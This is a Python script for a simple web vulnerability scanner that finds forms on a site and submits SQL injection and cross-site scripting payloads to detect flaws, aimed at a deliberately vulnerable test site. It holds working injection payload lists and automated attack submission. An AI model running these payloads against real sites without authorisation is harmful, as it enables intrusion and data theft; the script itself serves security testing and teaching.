import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys


class VulnerabilityScanner:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.vulnerabilities = []

    def get_forms(self):
        """Extract all forms from the target URL"""
        try:
            response = self.session.get(self.url)
            soup = BeautifulSoup(response.content, 'html.parser')
            return soup.find_all('form')
        except requests.exceptions.RequestException as e:
            print(f"[-] Error fetching URL: {str(e)}")
            return []

    def get_form_details(self, form):
        """Extract form details including action, method, and inputs"""
        details = {}

        # Get form action (URL to submit)
        action = form.attrs.get('action', '').lower()

        # Get form method (POST, GET, etc.)
        method = form.attrs.get('method', 'get').lower()

        # Get all input fields
        inputs = []
        for input_tag in form.find_all('input'):
            input_type = input_tag.attrs.get('type', 'text')
            input_name = input_tag.attrs.get('name')
            input_value = input_tag.attrs.get('value', '')
            inputs.append({
                'type': input_type,
                'name': input_name,
                'value': input_value
            })

        details['action'] = action
        details['method'] = method
        details['inputs'] = inputs

        return details

    def submit_form(self, form_details, payload):
        """Submit a form with the given payload"""
        target_url = urljoin(self.url, form_details['action'])

        # Prepare form data
        data = {}
        for input_field in form_details['inputs']:
            if input_field['type'] == 'text' or input_field['type'] == 'search':
                input_field['value'] = payload

            input_name = input_field.get('name')
            input_value = input_field.get('value')

            if input_name:
                data[input_name] = input_value

        # Submit form
        try:
            if form_details['method'] == 'post':
                return self.session.post(target_url, data=data)
            else:
                return self.session.get(target_url, params=data)
        except requests.exceptions.RequestException:
            return None

    def check_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print("\n[*] Testing for SQL Injection...")

        # SQL injection payloads
        sql_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
        ]

        # SQL error patterns
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "Warning: mysql",
            "ORA-01",
            "SQLServer JDBC Driver",
            "PostgreSQL query failed",
            "unterminated quoted string",
            "quoted string not properly terminated"
        ]

        forms = self.get_forms()

        for form in forms:
            form_details = self.get_form_details(form)

            for payload in sql_payloads:
                response = self.submit_form(form_details, payload)

                if response:
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vuln = {
                                'type': 'SQL Injection',
                                'payload': payload,
                                'form_action': form_details['action']
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] SQL Injection vulnerability found!")
                            print(f"    Payload: {payload}")
                            print(f"    Form: {form_details['action']}")
                            break

        if not any(v['type'] == 'SQL Injection' for v in self.vulnerabilities):
            print("[+] No SQL Injection vulnerabilities detected")

    def check_xss(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        print("\n[*] Testing for XSS...")

        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
        ]

        forms = self.get_forms()

        for form in forms:
            form_details = self.get_form_details(form)

            for payload in xss_payloads:
                response = self.submit_form(form_details, payload)

                if response and payload in response.text:
                    vuln = {
                        'type': 'XSS (Cross-Site Scripting)',
                        'payload': payload,
                        'form_action': form_details['action']
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] XSS vulnerability found!")
                    print(f"    Payload: {payload}")
                    print(f"    Form: {form_details['action']}")
                    break

        if not any(v['type'] == 'XSS (Cross-Site Scripting)' for v in self.vulnerabilities):
            print("[+] No XSS vulnerabilities detected")

    def run_scan(self):
        """Run all vulnerability scans"""
        print(f"\n{'=' * 60}")
        print(f"Starting vulnerability scan on: {self.url}")
        print(f"{'=' * 60}")

        self.check_sql_injection()
        self.check_xss()

        print(f"\n{'=' * 60}")
        print(f"Scan completed!")
        print(f"Total vulnerabilities found: {len(self.vulnerabilities)}")
        print(f"{'=' * 60}\n")

        return self.vulnerabilities


# Usage example
if __name__ == "__main__":
    # WARNING: Only scan websites you have permission to test!
    target_url = "http://testphp.vulnweb.com/"  # Test site

    scanner = VulnerabilityScanner(target_url)
    results = scanner.run_scan()
